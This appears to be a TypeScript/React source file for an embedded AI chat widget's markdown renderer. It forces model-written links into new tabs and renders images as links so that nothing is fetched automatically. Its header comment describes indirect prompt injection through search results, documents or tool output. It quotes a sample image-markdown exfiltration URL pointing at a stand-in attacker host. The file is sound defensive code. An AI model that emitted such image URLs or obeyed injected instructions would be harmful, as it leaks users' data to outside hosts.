'use client';

/**
 * The chat's markdown renderer: the vendored one, with the links the model
 * writes opened beside the host app instead of navigating it away.
 *
 * The packaged chat's whole premise is that it lives inside somebody else's
 * application — a Word task pane, an ERP dashboard, a partner's SPA. Upstream's
 * `a` renderer emits a bare `<a href>`, so one click on a source the agent cited
 * replaces the host app, taking whatever unsaved state it held with it. The
 * chat already made this call for its own link: the password-reset link in
 * `views/account.tsx` opens in a new tab for exactly this reason, and it applies
 * far more strongly to a link nobody on either side authored.
 *
 * Always, with no prop to turn it off. A same-tab link out of an agent's answer
 * is not something a partner should be able to opt into by accident.
 *
 * `rel="noopener noreferrer"` is about the opened page, which must not reach
 * back through `window.opener` or be handed the partner's URL as a referrer.
 *
 * AND IT IS AN INJECTION GUARD, for images. react-markdown's
 * `defaultUrlTransform` is in force (`@assistant-ui/react-markdown` sets no
 * override) and no `rehype-raw` is configured, so `javascript:` hrefs and raw
 * HTML are already neutralised — but an `https:` image is not, and a reply is
 * untrusted. Indirect prompt injection arrives through web search, an uploaded
 * document or a tool result, and an image is the sharpest way out: the model
 * chooses the host AND the query string, so
 * `![](https://attacker.example/x.png?d=…)` sends whatever it packed there the
 * moment the reply renders, with nobody clicking anything.
 *
 * So an image becomes a link, exactly as ADR 0009 requires and `/ui` has done
 * since: "Image: alt (host)", which the end-user may choose to open. Nothing is
 * fetched when the reply appears.
 *
 * Why the wrapper, and not the vendored file: `src/chat/vendor/*` is
 * hash-pinned and refetched from an unversioned registry, so an edit there is a
 * hunk to reconcile on every bump. Upstream renders `<MarkdownText />` with no
 * components map and offers no other seam, so `sync-registry.mjs` points its two
 * call sites at this file instead — a path rewrite, which needs no reconciling.
 */
import type { ComponentProps, FC } from 'react';
import { MarkdownText as VendoredMarkdownText } from './vendor/markdown-text.js';
import { cn } from './lib/cn.js';

/**
 * Upstream's own `a` classes, repeated: a component passed in `components`
 * REPLACES the default rather than wrapping it, and the default is not
 * exported. If a bump restyles links in `vendor/markdown-text.tsx`, copy the
 * class list across.
 */
const LINK_CLASS = 'aui-md-a text-primary hover:text-primary/80 underline underline-offset-2';

// The spread comes FIRST: `target` and `rel` are the point of this component
// and nothing coming out of the markdown may displace them.
const ExternalLink: FC<ComponentProps<'a'>> = ({ className, ...props }) => (
  <a {...props} className={cn(LINK_CLASS, className)} target="_blank" rel="noopener noreferrer" />
);

/**
 * The web hosts an end-user could meaningfully be shown. Anything else — data:,
 * blob:, a relative path — keeps its label and loses its destination, because
 * there is no host to name and nothing safe to offer.
 */
function webHost(src: string | undefined): string | null {
  if (!src) return null;
  try {
    const url = new URL(src, 'https://invalid.invalid');
    if (url.protocol !== 'http:' && url.protocol !== 'https:') return null;
    return url.host === 'invalid.invalid' ? null : url.host;
  } catch {
    return null;
  }
}

/** An image the model wrote, shown rather than loaded. */
const ImageAsLink: FC<ComponentProps<'img'>> = ({ src, alt }) => {
  const label = alt ? `Image: ${alt}` : 'Image';
  const href = typeof src === 'string' ? src : undefined;
  const host = webHost(href);
  if (!host || !href) return <span className="aui-md-img text-muted-foreground">{label}</span>;
  return (
    <a href={href} className={LINK_CLASS} target="_blank" rel="noopener noreferrer">
      {`${label} (${host})`}
    </a>
  );
};

const COMPONENTS = { a: ExternalLink, img: ImageAsLink };

/** Drop-in for the vendored `MarkdownText`; takes no props, as upstream's use does. */
export const MarkdownText: FC = () => <VendoredMarkdownText components={COMPONENTS} />;
